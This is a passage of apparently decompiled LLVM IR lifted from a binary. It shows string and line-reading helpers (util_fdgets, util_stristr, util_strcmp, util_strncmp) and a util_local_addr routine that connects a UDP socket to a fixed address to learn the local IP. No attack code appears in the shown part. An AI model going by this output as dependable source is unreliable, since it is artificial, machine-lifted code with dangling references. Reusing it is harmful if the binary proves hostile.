  %v0_11a64 = phi i1 [ %v2_11a50, %bb58 ], [ %v6_11a60, %bb59 ]
  %v2_11a64 = xor i1 %v1_11a64, true
  %v3_11a64 = and i1 %v0_11a64, %v2_11a64
  br i1 %v3_11a64, label %dec_label_pc_11ac8, label %dec_label_pc_11a68

dec_label_pc_11a68:                               ; preds = %bb60
  %v2_11a68 = icmp eq i32 %v0_11a68, 0
  %. = select i1 %v2_11a68, i32 87, i32 55
  %v2_11a74 = sub nsw i32 %v1_11a74, %.
  br label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a34, %dec_label_pc_11a68
  %v0_11a8c33 = phi i32 [ %v1_11a48, %dec_label_pc_11a34 ], [ %., %dec_label_pc_11a68 ]
  %v3_11ab0 = phi i32 [ %v1_11a44, %dec_label_pc_11a34 ], [ %v2_11a74, %dec_label_pc_11a68 ]
  %v2_11a78 = sub i32 %v3_11ab0, %arg2
  %v4_11a78 = xor i32 %v3_11ab0, %arg2
  %v5_11a78 = xor i32 %v2_11a78, %v3_11ab0
  %v6_11a78 = and i32 %v5_11a78, %v4_11a78
  %v7_11a78 = icmp slt i32 %v6_11a78, 0
  %v8_11a78 = icmp slt i32 %v2_11a78, 0
  %v2_11a7c = xor i1 %v8_11a78, %v7_11a78
  br i1 %v2_11a7c, label %dec_label_pc_11a80, label %dec_label_pc_11ac8

dec_label_pc_11a80:                               ; preds = %dec_label_pc_11a78
  br i1 %v3_11a84, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_11a80
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_11a80, %bb63
  %v0_11a8c32 = phi i32 [ %v0_11a8c33, %dec_label_pc_11a80 ], [ 0, %bb63 ]
  br i1 %v3_11a88, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_11a8c = phi i32 [ %v0_11a8c32, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_11a8c, 0
  %v4_11a8c = zext i1 %tmp88 to i32
  %v5_11a8c = or i32 %v0_11a8c, %v4_11a8c
  %v7_11a8c = icmp eq i32 %v5_11a8c, 0
  br i1 %v7_11a8c, label %dec_label_pc_11a94, label %dec_label_pc_11abc

dec_label_pc_11a94:                               ; preds = %bb66
  %v2_11aa0 = sub i32 %v3_11ab0, %v3_11a14
  %v4_11aa0 = xor i32 %v3_11ab0, %v3_11a14
  %v5_11aa0 = xor i32 %v2_11aa0, %v3_11ab0
  %v6_11aa0 = and i32 %v5_11aa0, %v4_11aa0
  %v7_11aa0 = icmp slt i32 %v6_11aa0, 0
  %v8_11aa0 = icmp slt i32 %v2_11aa0, 0
  %v9_11aa0 = icmp eq i32 %v3_11ab0, %v3_11a14
  %v3_11aa4 = xor i1 %v8_11aa0, %v7_11aa0
  %v4_11aa4 = or i1 %v9_11aa0, %v3_11aa4
  br i1 %v4_11aa4, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_11a94
  store i32 1, i32* @ip, align 4
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_11a94
  store i32 1, i32* @ip, align 4
  br i1 %v2_11aa8, label %.thread5, label %dec_label_pc_11abc

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_11ab0 = mul i32 %v2_11ab0.ph, %arg2
  %v5_11ab0 = add i32 %v3_11ab0, %v4_11ab0
  %v2_11ab4 = inttoptr i32 %v1_11ab4 to i8*
  %v3_11ab4 = load i8, i8* %v2_11ab4, align 1
  %v6_11ab4 = add i32 %v1_11ab4, 1
  br label %dec_label_pc_11a34.outer

dec_label_pc_11abc:                               ; preds = %thread-pre-split, %bb66
  %v1_11abc = inttoptr i32 %v1_11ab4 to i8*
  %v2_11abc = load i8, i8* %v1_11abc, align 1
  %v5_11abc = add i32 %v1_11ab4, 1
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_11a34

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11a78, %bb60
  %v1_11ac8 = icmp slt i32 %v1_11a8c, 0
  %v2_11af4 = icmp eq i32 %v0_11af4, 0
  br i1 %v1_11ac8, label %dec_label_pc_11af4, label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11ac8
  br i1 %v2_11af4, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_11ad0
  %v2_11ad4 = sub i32 0, %v2_11ab0.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_11ad0, %bb69
  %v1_11ae0 = phi i32 [ -2147483648, %bb71 ], [ %v2_11ab0.ph, %dec_label_pc_11ad0 ], [ %v2_11ad4, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_11ae0

dec_label_pc_11ae4:                               ; preds = %dec_label_pc_119f4
  %v1_11ae4 = inttoptr i32 %v5_119d8 to i8*
  %v2_11ae4 = load i8, i8* %v1_11ae4, align 1
  %v5_11ae4 = add i32 %v0_119d8, 2
  br label %dec_label_pc_11a0c

dec_label_pc_11af4:                               ; preds = %dec_label_pc_11ac8
  br i1 %v2_11af4, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_11af4
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_11af4
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_11af4, { 1, 0 }
  uselistorder i32 %v2_11aa0, { 1, 0 }
  uselistorder i32 %v2_11a78, { 1, 0 }
  uselistorder i32 %v3_11ab0, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_11a50, { 1, 2, 0 }
  uselistorder i1 %v2_11a50, { 1, 0, 2 }
  uselistorder i32 %v1_11a34, { 1, 2, 0 }
  uselistorder i32 %v1_11a74, { 1, 0, 2 }
  uselistorder i32 %v1_11a8c, { 1, 0 }
  uselistorder i32 %v1_11ab4, { 2, 3, 1, 0 }
  uselistorder i1 %v9_11a80, { 1, 0, 2 }
  uselistorder i1 %v3_11a80, { 1, 0 }
  uselistorder i32 %v2_11ab0.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_11a14, { 1, 0, 2 }
  uselistorder i32 %v2_11a14, { 1, 0 }
  uselistorder i32 %v5_119d8, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_119d8, { 0, 1, 3, 2 }
  uselistorder i32 25, { 10, 11, 0, 9, 1, 6, 2, 7, 3, 8, 5, 4, 12 }
  uselistorder i8 32, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i8 9, { 4, 0, 3, 1, 2 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_11a78, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_11a34, { 1, 0 }
  uselistorder label %dec_label_pc_11a0c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_119d8, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11b04 = load i32, i32* @r4, align 4
  store i32 %v3_11b04, i32* %stack_var_-24, align 4
  %v6_11b04 = load i32, i32* @r5, align 4
  %v9_11b04 = load i32, i32* @r6, align 4
  %v12_11b04 = load i32, i32* @r7, align 4
  %v15_11b04 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_11b1c

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_11b40.dec_label_pc_11b1c_crit_edge, %entry
  %v0_11b20 = phi i32 [ %v0_11b20.pre, %dec_label_pc_11b40.dec_label_pc_11b1c_crit_edge ], [ %arg3, %entry ]
  %v0_11b1c = phi i32 [ %v5_11b40, %dec_label_pc_11b40.dec_label_pc_11b1c_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_11b1c, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_11b28 = call i32 @__libc_read(i32 %v0_11b20)
  %v7_11b2c = icmp eq i32 %v1_11b28, 1
  %v0_11b34 = load i32, i32* @r5, align 4
  br i1 %v7_11b2c, label %dec_label_pc_11b34, label %dec_label_pc_11b4c

dec_label_pc_11b34:                               ; preds = %dec_label_pc_11b1c
  %v1_11b34 = add i32 %v0_11b34, 1
  store i32 %v1_11b34, i32* @r5, align 4
  %v1_11b38 = load i32, i32* @r8, align 4
  %v6_11b3c = icmp slt i32 %v1_11b34, %v1_11b38
  br i1 %v6_11b3c, label %dec_label_pc_11b40, label %.loopexit

dec_label_pc_11b40:                               ; preds = %dec_label_pc_11b34
  %v0_11b40 = load i32, i32* @r4, align 4
  %v1_11b40 = inttoptr i32 %v0_11b40 to i8*
  %v2_11b40 = load i8, i8* %v1_11b40, align 1
  %v3_11b40 = zext i8 %v2_11b40 to i32
  store i32 %v3_11b40, i32* @r3, align 4
  %v5_11b40 = add i32 %v0_11b40, 1
  store i32 %v5_11b40, i32* @r4, align 4
  %v7_11b44 = icmp eq i8 %v2_11b40, 10
  br i1 %v7_11b44, label %dec_label_pc_11b4c, label %dec_label_pc_11b40.dec_label_pc_11b1c_crit_edge

dec_label_pc_11b40.dec_label_pc_11b1c_crit_edge:  ; preds = %dec_label_pc_11b40
  %v0_11b20.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_11b1c

dec_label_pc_11b4c:                               ; preds = %dec_label_pc_11b1c, %dec_label_pc_11b40
  %v0_11b4c = phi i32 [ %v1_11b34, %dec_label_pc_11b40 ], [ %v0_11b34, %dec_label_pc_11b1c ]
  %v2_11b4c = icmp eq i32 %v0_11b4c, 0
  br i1 %v2_11b4c, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_11b4c
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_11b34, %dec_label_pc_11b4c, %bb
  %v0_11b54 = load i32, i32* @r7, align 4
  %v2_11b58 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11b58, i32* @r4, align 4
  store i32 %v6_11b04, i32* @r5, align 4
  store i32 %v9_11b04, i32* @r6, align 4
  store i32 %v12_11b04, i32* @r7, align 4
  store i32 %v15_11b04, i32* @r8, align 4
  ret i32 %v0_11b54

; uselistorder directives
  uselistorder i32 %v5_11b40, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11b4c, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11b60 = load i32, i32* @r4, align 4
  %v6_11b60 = load i32, i32* @r5, align 4
  %v9_11b60 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_11b70 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_11b78 = inttoptr i32 %v0_11b70 to i32*
  store i32 0, i32* %v2_11b78, align 4
  %v0_11b84 = load i32, i32* %r4.global-to-local, align 4
  %v3_11b88 = call i32 @socket(i32 2, i32 2, i32 %v0_11b84)
  %v7_11b8c = icmp eq i32 %v3_11b88, -1
  store i32 %v3_11b88, i32* @r5, align 4
  br i1 %v7_11b8c, label %bb, label %dec_label_pc_11b9c

bb:                                               ; preds = %entry
  %v1_11b94 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11be8

dec_label_pc_11b9c:                               ; preds = %entry
  %v2_11ba8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11ba8, i32* @r4, align 4
  %v0_11bb4 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_11bc8 = call i32 @__libc_connect(i32 %v3_11b88, i32 %v2_11ba8, i32 %v0_11bb4)
  store i32 %v2_11ba8, i32* @r1, align 4
  %v2_11bd0 = ptrtoint i32* %stack_var_-20 to i32
  %v0_11bd4 = load i32, i32* @r5, align 4
  %v3_11bd8 = call i32 @__GI_getsockname(i32 %v0_11bd4, i32 %v2_11ba8, i32 %v2_11bd0)
  %v0_11bdc = load i32, i32* @r5, align 4
  %v1_11be0 = call i32 @__GI___libc_close(i32 %v0_11bdc)
  br label %dec_label_pc_11be8

dec_label_pc_11be8:                               ; preds = %bb, %dec_label_pc_11b9c
  %storemerge = phi i32 [ 134744072, %dec_label_pc_11b9c ], [ %v1_11b94, %bb ]
  store i32 %v3_11b60, i32* @r4, align 4
  store i32 %v6_11b60, i32* @r5, align 4
  store i32 %v9_11b60, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_11ba8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_11b88, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 134744072, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 8, 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 17, 18, 15, 16, 2, 1, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 ()* @__GI___errno_location, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_11be8, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_11bf8 = load i8, i8* %tmp, align 1
  %v4_11bf8 = zext i8 %v3_11bf8 to i32
  store i32 %v4_11bf8, i32* @r3, align 4
  %v2_11bfc = icmp eq i8 %v3_11bf8, 0
  br i1 %v2_11bfc, label %bb, label %dec_label_pc_11c10

bb:                                               ; preds = %entry
  br label %dec_label_pc_11c24

dec_label_pc_11c10:                               ; preds = %entry
  br label %dec_label_pc_11c14

dec_label_pc_11c14:                               ; preds = %dec_label_pc_11c14, %dec_label_pc_11c10
  %v0_11c14 = phi i32 [ %v1_11c14, %dec_label_pc_11c14 ], [ 0, %dec_label_pc_11c10 ]
  %v1_11c14 = add i32 %v0_11c14, 1
  %v2_11c18 = add i32 %v1_11c14, %arg2
  %v3_11c18 = inttoptr i32 %v2_11c18 to i8*
  %v4_11c18 = load i8, i8* %v3_11c18, align 1
  %v6_11c18 = zext i8 %v4_11c18 to i32
  store i32 %v6_11c18, i32* @r3, align 4
  %v2_11c1c = icmp eq i8 %v4_11c18, 0
  br i1 %v2_11c1c, label %dec_label_pc_11c24, label %dec_label_pc_11c14

dec_label_pc_11c24:                               ; preds = %dec_label_pc_11c14, %bb
  %v0_11c6821 = phi i32 [ %v4_11bf8, %bb ], [ %v1_11c14, %dec_label_pc_11c14 ]
  %v0_11c2c2 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_11c2c2, 1
  br i1 %tmp29, label %dec_label_pc_11c7c, label %dec_label_pc_11c38

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11c24, %dec_label_pc_11c2c.backedge
  %v0_11c30.in = phi i32 [ %v0_11c30, %dec_label_pc_11c2c.backedge ], [ %v0_11c2c2, %dec_label_pc_11c24 ]
  %v1_11c44 = phi i32 [ %v1_11c4415, %dec_label_pc_11c2c.backedge ], [ 0, %dec_label_pc_11c24 ]
  %v0_11c38 = phi i32 [ %v5_11c38, %dec_label_pc_11c2c.backedge ], [ %tmp23, %dec_label_pc_11c24 ]
  %v0_11c30 = add i32 %v0_11c30.in, -1
  %v1_11c38 = inttoptr i32 %v0_11c38 to i8*
  %v2_11c38 = load i8, i8* %v1_11c38, align 1
  %v3_11c38 = zext i8 %v2_11c38 to i32
  store i32 %v3_11c38, i32* @ip, align 4
  %v5_11c38 = add i32 %v0_11c38, 1
  %v1_11c3c = add nsw i32 %v3_11c38, -65
  %v2_11c44 = add i32 %v1_11c44, %arg2
  %v3_11c44 = inttoptr i32 %v2_11c44 to i8*
  %v4_11c44 = load i8, i8* %v3_11c44, align 1
  %v6_11c44 = zext i8 %v4_11c44 to i32
  store i32 %v6_11c44, i32* @r3, align 4
  %v1_11c48 = add nsw i32 %v6_11c44, -65
  %tmp38 = icmp ult i32 %v1_11c3c, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_11c38
  %v5_11c4c = or i32 %v3_11c38, 96
  store i32 %v5_11c4c, i32* @ip, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_11c38, %bb30
  %v0_11c58 = phi i32 [ %v3_11c38, %dec_label_pc_11c38 ], [ %v5_11c4c, %bb30 ]
  %tmp39 = icmp ult i32 %v1_11c48, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_11c54 = or i32 %v6_11c44, 96
  store i32 %v5_11c54, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_11c58 = phi i32 [ %v6_11c44, %bb31 ], [ %v5_11c54, %bb32 ]
  %v9_11c58 = icmp eq i32 %v0_11c58, %v1_11c58
  br i1 %v9_11c58, label %dec_label_pc_11c64, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_11c2c.backedge

dec_label_pc_11c2c.backedge:                      ; preds = %bb34, %dec_label_pc_11c64
  %v1_11c4415 = phi i32 [ 0, %bb34 ], [ %v1_11c64, %dec_label_pc_11c64 ]
  %tmp35 = icmp slt i32 %v0_11c30, 1
  br i1 %tmp35, label %dec_label_pc_11c7c, label %dec_label_pc_11c38

dec_label_pc_11c64:                               ; preds = %bb33
  %v1_11c64 = add i32 %v1_11c44, 1
  %v9_11c68 = icmp eq i32 %v0_11c6821, %v1_11c64
  br i1 %v9_11c68, label %dec_label_pc_11c70, label %dec_label_pc_11c2c.backedge

dec_label_pc_11c70:                               ; preds = %dec_label_pc_11c64
  %v2_11c70 = sub i32 %v5_11c38, %tmp23
  br label %dec_label_pc_11c7c

dec_label_pc_11c7c:                               ; preds = %dec_label_pc_11c2c.backedge, %dec_label_pc_11c24, %dec_label_pc_11c70
  %storemerge = phi i32 [ %v2_11c70, %dec_label_pc_11c70 ], [ -1, %dec_label_pc_11c24 ], [ -1, %dec_label_pc_11c2c.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_11c64, { 1, 0 }
  uselistorder i32 %v0_11c38, { 1, 0 }
  uselistorder i32 %v1_11c44, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder label %dec_label_pc_11c7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11c2c.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_11c38, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11c84 = load i8, i8* %arg1, align 1
  %v2_11c88 = icmp eq i8 %v2_11c84, 0
  br i1 %v2_11c88, label %bb, label %dec_label_pc_11c94

bb:                                               ; preds = %entry
  %v3_11c84 = zext i8 %v2_11c84 to i32
  br label %dec_label_pc_11ca8

dec_label_pc_11c94:                               ; preds = %entry
  br label %dec_label_pc_11c98

dec_label_pc_11c98:                               ; preds = %dec_label_pc_11c98, %dec_label_pc_11c94
  %v0_11c98 = phi i32 [ %v1_11c98, %dec_label_pc_11c98 ], [ 0, %dec_label_pc_11c94 ]
  %v1_11c98 = add i32 %v0_11c98, 1
  %v2_11c9c = add i32 %v1_11c98, %tmp
  %v3_11c9c = inttoptr i32 %v2_11c9c to i8*
  %v4_11c9c = load i8, i8* %v3_11c9c, align 1
  %v2_11ca0 = icmp eq i8 %v4_11c9c, 0
  br i1 %v2_11ca0, label %dec_label_pc_11ca8, label %dec_label_pc_11c98

dec_label_pc_11ca8:                               ; preds = %dec_label_pc_11c98, %bb
  %v0_11cf43 = phi i32 [ %v3_11c84, %bb ], [ %v1_11c98, %dec_label_pc_11c98 ]
  %v1_11ca8 = inttoptr i32 %arg2 to i8*
  %v2_11ca8 = load i8, i8* %v1_11ca8, align 1
  %v2_11cac = icmp eq i8 %v2_11ca8, 0
  br i1 %v2_11cac, label %bb21, label %dec_label_pc_11cb8

bb21:                                             ; preds = %dec_label_pc_11ca8
  %v3_11ca8 = zext i8 %v2_11ca8 to i32
  br label %dec_label_pc_11ccc

dec_label_pc_11cb8:                               ; preds = %dec_label_pc_11ca8
  br label %dec_label_pc_11cbc

dec_label_pc_11cbc:                               ; preds = %dec_label_pc_11cbc, %dec_label_pc_11cb8
  %v0_11cbc = phi i32 [ %v1_11cbc, %dec_label_pc_11cbc ], [ 0, %dec_label_pc_11cb8 ]
  %v1_11cbc = add i32 %v0_11cbc, 1
  %v2_11cc0 = add i32 %v1_11cbc, %arg2
  %v3_11cc0 = inttoptr i32 %v2_11cc0 to i8*
  %v4_11cc0 = load i8, i8* %v3_11cc0, align 1
  %v2_11cc4 = icmp eq i8 %v4_11cc0, 0
  br i1 %v2_11cc4, label %dec_label_pc_11ccc, label %dec_label_pc_11cbc

dec_label_pc_11ccc:                               ; preds = %dec_label_pc_11cbc, %bb21
  %v0_11ccc = phi i32 [ %v3_11ca8, %bb21 ], [ %v1_11cbc, %dec_label_pc_11cbc ]
  %v9_11ccc = icmp eq i32 %v0_11ccc, %v0_11cf43
  br i1 %v9_11ccc, label %dec_label_pc_11cf4.preheader, label %dec_label_pc_11cd4

dec_label_pc_11cf4.preheader:                     ; preds = %dec_label_pc_11ccc
  %v2_11cf45 = icmp eq i32 %v0_11cf43, 0
  br i1 %v2_11cf45, label %dec_label_pc_11cfc, label %dec_label_pc_11cdc

dec_label_pc_11cd4:                               ; preds = %dec_label_pc_11cdc, %dec_label_pc_11ccc
  ret i32 0

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cec, %dec_label_pc_11cf4.preheader
  %v0_11cf4.in = phi i32 [ %v0_11cf4, %dec_label_pc_11cec ], [ %v0_11cf43, %dec_label_pc_11cf4.preheader ]
  %v0_11cf0 = phi i32 [ %v1_11cf0, %dec_label_pc_11cec ], [ %arg2, %dec_label_pc_11cf4.preheader ]
  %v0_11cec = phi i32 [ %v1_11cec, %dec_label_pc_11cec ], [ %tmp, %dec_label_pc_11cf4.preheader ]
  %v0_11cf4 = add i32 %v0_11cf4.in, -1
  %v1_11cdc = inttoptr i32 %v0_11cec to i8*
  %v2_11cdc = load i8, i8* %v1_11cdc, align 1
  %v1_11ce0 = inttoptr i32 %v0_11cf0 to i8*
  %v2_11ce0 = load i8, i8* %v1_11ce0, align 1
  %v9_11ce4 = icmp eq i8 %v2_11cdc, %v2_11ce0
  br i1 %v9_11ce4, label %dec_label_pc_11cec, label %dec_label_pc_11cd4

dec_label_pc_11cec:                               ; preds = %dec_label_pc_11cdc
  %v1_11cec = add i32 %v0_11cec, 1
  %v1_11cf0 = add i32 %v0_11cf0, 1
  %v2_11cf4 = icmp eq i32 %v0_11cf4, 0
  br i1 %v2_11cf4, label %dec_label_pc_11cfc, label %dec_label_pc_11cdc

dec_label_pc_11cfc:                               ; preds = %dec_label_pc_11cec, %dec_label_pc_11cf4.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_11ca8, { 1, 0 }
  uselistorder i8 %v2_11c84, { 1, 0 }
}

define i32 @util_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_11d08 = load i8, i8* %arg1, align 1
  %v2_11d0c = icmp eq i8 %v2_11d08, 0
  %v0_11d10 = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_11d0c, label %bb, label %dec_label_pc_11d1c

bb:                                               ; preds = %entry
  %v3_11d08 = zext i8 %v2_11d08 to i32
  br label %dec_label_pc_11d30

dec_label_pc_11d1c:                               ; preds = %entry
  br label %dec_label_pc_11d20

dec_label_pc_11d20:                               ; preds = %dec_label_pc_11d20, %dec_label_pc_11d1c
  %v0_11d20 = phi i32 [ %v1_11d20, %dec_label_pc_11d20 ], [ 0, %dec_label_pc_11d1c ]
  %v1_11d20 = add i32 %v0_11d20, 1
  %v2_11d24 = add i32 %v1_11d20, %tmp
  %v3_11d24 = inttoptr i32 %v2_11d24 to i8*
  %v4_11d24 = load i8, i8* %v3_11d24, align 1
  %v2_11d28 = icmp eq i8 %v4_11d24, 0
  br i1 %v2_11d28, label %dec_label_pc_11d30, label %dec_label_pc_11d20

dec_label_pc_11d30:                               ; preds = %dec_label_pc_11d20, %bb
  %v6_11d58 = phi i32 [ %v3_11d08, %bb ], [ %v1_11d20, %dec_label_pc_11d20 ]
  %v0_11d30 = load i32, i32* %r1.global-to-local, align 4
  %v1_11d30 = inttoptr i32 %v0_11d30 to i8*
  %v2_11d30 = load i8, i8* %v1_11d30, align 1
  %v3_11d30 = zext i8 %v2_11d30 to i32
  %v2_11d34 = icmp eq i8 %v2_11d30, 0
  br i1 %v2_11d34, label %bb26, label %dec_label_pc_11d40

bb26:                                             ; preds = %dec_label_pc_11d30
  store i32 %v3_11d30, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11d54

dec_label_pc_11d40:                               ; preds = %dec_label_pc_11d30
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11d44

dec_label_pc_11d44:                               ; preds = %dec_label_pc_11d44, %dec_label_pc_11d40
  %v0_11d44 = phi i32 [ %v1_11d44, %dec_label_pc_11d44 ], [ 0, %dec_label_pc_11d40 ]
  %v1_11d44 = add i32 %v0_11d44, 1
  store i32 %v1_11d44, i32* %r2.global-to-local, align 4
  %v2_11d48 = add i32 %v1_11d44, %v0_11d30
  %v3_11d48 = inttoptr i32 %v2_11d48 to i8*
  %v4_11d48 = load i8, i8* %v3_11d48, align 1
  %v2_11d4c = icmp eq i8 %v4_11d48, 0
  br i1 %v2_11d4c, label %dec_label_pc_11d54, label %dec_label_pc_11d44

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11d44, %bb26
  %v0_11d54 = phi i32 [ %v3_11d30, %bb26 ], [ %v1_11d44, %dec_label_pc_11d44 ]
  %v2_11d54 = sub i32 %v0_11d54, %v0_11d10
  %v4_11d54 = xor i32 %v0_11d54, %v0_11d10
  %v5_11d54 = xor i32 %v2_11d54, %v0_11d54
  %v6_11d54 = and i32 %v5_11d54, %v4_11d54
  %v5_11d58 = icmp slt i32 %v0_11d54, %v0_11d10
  br i1 %v5_11d58, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_11d54
  %v8_11d58 = sub i32 %v6_11d58, %v0_11d10
  %v10_11d58 = xor i32 %v6_11d58, %v0_11d10
  %v11_11d58 = xor i32 %v8_11d58, %v6_11d58
  %v12_11d58 = and i32 %v11_11d58, %v10_11d58
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_11d54, %bb27
  %v1_11d5c.in = phi i32 [ %v6_11d54, %dec_label_pc_11d54 ], [ %v12_11d58, %bb27 ]
  %v0_11d5c.in = phi i32 [ %v2_11d54, %dec_label_pc_11d54 ], [ %v8_11d58, %bb27 ]
  %v0_11d5c = icmp slt i32 %v0_11d5c.in, 0
  %v1_11d5c = icmp slt i32 %v1_11d5c.in, 0
  %v2_11d5c = xor i1 %v1_11d5c, %v0_11d5c
  br i1 %v2_11d5c, label %dec_label_pc_11d88, label %dec_label_pc_11d6c.preheader

dec_label_pc_11d6c.preheader:                     ; preds = %bb28
  %v2_11d6c5 = icmp eq i32 %v0_11d10, 0
  br i1 %v2_11d6c5, label %dec_label_pc_11d88, label %dec_label_pc_11d74

dec_label_pc_11d64:                               ; preds = %dec_label_pc_11d74
  %v1_11d64 = add i32 %v0_11d64, 1
  %v1_11d68 = add i32 %v0_11d68, 1
  store i32 %v1_11d68, i32* %r1.global-to-local, align 4
  %v2_11d6c = icmp eq i32 %v0_11d6c, 0
  br i1 %v2_11d6c, label %dec_label_pc_11d88, label %dec_label_pc_11d74

dec_label_pc_11d74:                               ; preds = %dec_label_pc_11d64, %dec_label_pc_11d6c.preheader
  %v0_11d6c.in = phi i32 [ %v0_11d6c, %dec_label_pc_11d64 ], [ %v0_11d10, %dec_label_pc_11d6c.preheader ]
  %v0_11d68 = phi i32 [ %v1_11d68, %dec_label_pc_11d64 ], [ %v0_11d30, %dec_label_pc_11d6c.preheader ]
  %v0_11d64 = phi i32 [ %v1_11d64, %dec_label_pc_11d64 ], [ %tmp, %dec_label_pc_11d6c.preheader ]
  %v0_11d6c = add i32 %v0_11d6c.in, -1
  %v1_11d74 = inttoptr i32 %v0_11d64 to i8*
  %v2_11d74 = load i8, i8* %v1_11d74, align 1
  %v3_11d74 = zext i8 %v2_11d74 to i32
  store i32 %v3_11d74, i32* %r2.global-to-local, align 4
  %v1_11d78 = inttoptr i32 %v0_11d68 to i8*
  %v2_11d78 = load i8, i8* %v1_11d78, align 1
